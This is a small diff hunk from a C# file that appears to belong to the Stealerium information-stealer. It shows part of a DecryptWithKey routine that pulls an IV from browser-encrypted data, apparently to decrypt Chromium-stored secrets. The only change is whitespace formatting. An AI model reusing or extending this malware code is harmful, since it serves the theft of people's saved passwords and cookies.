@@ -152,7 +152,7 @@ namespace Stealerium.Target.Browsers.Chromium
 
         public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
         {
-            byte[] bIv = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+            byte[] bIv = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
             Array.Copy(bEncryptedData, 3, bIv, 0, 12);
 
             try
